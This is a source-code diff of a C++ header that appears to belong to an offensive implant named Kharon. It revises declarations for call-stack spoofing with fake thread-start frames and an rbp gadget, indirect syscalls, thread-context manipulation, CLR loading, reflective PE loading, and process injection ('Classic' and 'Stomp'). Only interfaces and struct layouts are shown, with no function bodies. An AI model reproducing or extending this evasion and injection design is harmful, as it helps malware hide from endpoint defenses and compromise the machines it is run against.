@@ -983,14 +983,12 @@ public:
 };
 
 struct _FRAME_INFO {
-    UPTR Lib;  // function module
     UPTR Ptr;  // pointer to function + offset
     UPTR Size; // stack size
 };
 typedef _FRAME_INFO FRAME_INFO;
 
 struct _GADGET_INFO {
-    UPTR Lib;  // function module
     UPTR Ptr;  // pointer to gadget
     UPTR Size; // stack size
 };
@@ -1003,56 +1001,59 @@ public:
     Spoof( Root::Kharon* KharonRf ) : Self( KharonRf ) {}
 
     BOOL Enabled   = KH_CALL_STACK_SPOOF;
-    BOOL ProxyCall = KH_PROXY_CALL;
 
     struct {
-        FRAME_INFO First;  // RtlUserThreadStart+0x21
-        FRAME_INFO Second; // BaseThreadInitThunk+0x14
-        FRAME_INFO Gadget;
+        FRAME_INFO First;   // 0x00  // RtlUserThreadStart+0x21
+        FRAME_INFO Second;  // 0x10  // BaseThreadInitThunk+0x14
+        FRAME_INFO Gadget;  // 0x20  // rbp gadget
         
-        UPTR ArgCount;
-        UPTR Args[8];
+        UPTR Restore;      // 0x30
+        UPTR Ssn;          // 0x38
+        UPTR Ret;          // 0x40
+        
+        UPTR Rbx;          // 0x48
+        UPTR Rdi;          // 0x50
+        UPTR Rsi;          // 0x58
+        UPTR R12;          // 0x60
+        UPTR R13;          // 0x68
+        UPTR R14;          // 0x70
+        UPTR R15;          // 0x78
+
+        UPTR ArgCount;     // 0x80
     } Setup = {
         .First { 
-            .Lib = this->Self->Ntdll.Handle,
             .Ptr = (UPTR)this->Self->Ntdll.RtlUserThreadStart + 0x21
         },
-        .Second{
-            .Lib = this->Self->KrnlBase.Handle,
+        .Second {
             .Ptr = (UPTR)this->Self->Krnl32.BaseThreadInitThunk + 0x14,
-        }
+        },
     };
 
-    auto TimerCall(
-        _In_ UPTR Context,
-        _In_ INT8 Identifier
-    ) -> LONG;
-
-    auto WorkCall(
-        _In_ UPTR Context,
-        _In_ INT8 Identifier
-    ) -> LONG;
-
-    template <typename... Args>
     auto Call( 
-        _In_ UPTR Lib, 
         _In_ UPTR Fnc, 
-        Args... args
-    );
+        _In_ UPTR Ssn,
+        _In_ UPTR Arg1  = 0,
+        _In_ UPTR Arg2  = 0,
+        _In_ UPTR Arg3  = 0,
+        _In_ UPTR Arg4  = 0,
+        _In_ UPTR Arg5  = 0, 
+        _In_ UPTR Arg6  = 0,
+        _In_ UPTR Arg7  = 0,
+        _In_ UPTR Arg8  = 0,
+        _In_ UPTR Arg9  = 0,
+        _In_ UPTR Arg10 = 0,
+        _In_ UPTR Arg11 = 0,
+        _In_ UPTR Arg12 = 0
+    ) -> UPTR;
+
+    auto StackSizeWrapper(
+        _In_ UPTR RetAddress
+    ) -> UPTR;
 
     auto StackSize(
-        _In_ UPTR  LibBase,
-        _In_ PVOID UnwInfo
-    ) -> ULONG;
-
-    auto GetRtmEntry(
-        _In_ UPTR LibBase,
-        _In_ UPTR FncOffset
-    ) -> PIMAGE_RUNTIME_FUNCTION_ENTRY;
-
-    auto CalcFncStack(
-
-    );
+        _In_ UPTR RtmFunction,
+        _In_ UPTR ImgBase
+    ) -> UPTR;
 };
 
 struct _BOF_OBJ {
@@ -1358,8 +1359,26 @@ public:
     ) -> HANDLE;
 
     static auto LoadLibraryA(
-        _In_ PCHAR LibraryName
+        CHAR* LibraryName
     ) -> HMODULE;
+
+    static auto LoadLibraryW(
+        WCHAR* LibraryName
+    ) -> HMODULE;
+
+    static auto CLRCreateInstance(
+        const IID &clsid, const IID &riid, LPVOID *ppInterface
+    ) -> HRESULT;
+
+    static auto GetThreadContext(
+        HANDLE  Handle,
+        CONTEXT Ctx
+    ) -> BOOL;
+
+    static auto SetThreadContext(
+        HANDLE  Handle,
+        CONTEXT Ctx
+    ) -> BOOL; 
 };
 
 class Syscall {
@@ -1369,14 +1388,14 @@ public:
     Syscall( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
 
     BOOL Enabled = KH_INDIRECT_SYSCALL_ENABLED;
-    ESYS_OPT Index;
+    INT8 Index;
 
     struct {
         ULONG ssn;
         ULONG Hash;
         UPTR  Address;
         UPTR  Instruction;
-    } Ext[syLast] = {};
+    } Ext[Sys::Last] = {};
 
     auto Fetch(
         _In_ INT8 SysIdx
@@ -1714,22 +1733,22 @@ public:
     auto FixRel(
         _In_ PVOID Base,
         _In_ UPTR  Delta,
-        _In_ PIMAGE_DATA_DIRECTORY DataDir
+        _In_ IMAGE_DATA_DIRECTORY* DataDir
     ) -> VOID;
 
     auto FixExp(
         _In_ PVOID Base,
-        _In_ PIMAGE_DATA_DIRECTORY DataDir
+        _In_ IMAGE_DATA_DIRECTORY* DataDir
     ) -> VOID;
 
     auto FixTls(
         _In_ PVOID Base,
-        _In_ PIMAGE_DATA_DIRECTORY DataDir
+        _In_ IMAGE_DATA_DIRECTORY* DataDir
     ) -> VOID;
 
     auto FixImp(
         _In_ PVOID Base,
-        _In_ PIMAGE_DATA_DIRECTORY DataDir
+        _In_ IMAGE_DATA_DIRECTORY* DataDir
     ) -> BOOL;
 };
 
@@ -2191,6 +2210,16 @@ class Thread {
 public:
     Thread( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
 
+    auto Thread::GetCtx(
+        HANDLE  Handle,
+        CONTEXT Ctx
+    ) -> BOOL;
+
+    auto Thread::SetCtx(
+        HANDLE  Handle,
+        CONTEXT Ctx
+    ) -> BOOL;
+
     auto Create(
         _In_  HANDLE ProcessHandle,
         _In_  PVOID  StartAddress,
@@ -2527,19 +2556,19 @@ public:
     ) -> BOOL;
 
     auto Classic(
-        _In_  ULONG   ProcessID,
-        _In_  BYTE*   Buffer,
-        _In_  UPTR    Size,
-        _In_  PVOID   Param,
-        _Out_ PVOID*  Base
+        _In_  ULONG  ProcessID,
+        _In_  BYTE*  Buffer,
+        _In_  UPTR   Size,
+        _In_  PVOID  Param,
+        _Out_ PVOID &Base
     ) -> BOOL;
 
     auto Stomp(
-        _In_  ULONG   ProcessID,
-        _In_  BYTE*   Buffer,
-        _In_  UPTR    Size,
-        _In_  PVOID   Param,
-        _Out_ PVOID*  Base
+        _In_  ULONG ProcessID,
+        _In_  BYTE* Buffer,
+        _In_  UPTR  Size,
+        _In_  PVOID Param,
+        _Out_ PVOID &Base
     ) -> BOOL;
 
     auto Reflection(
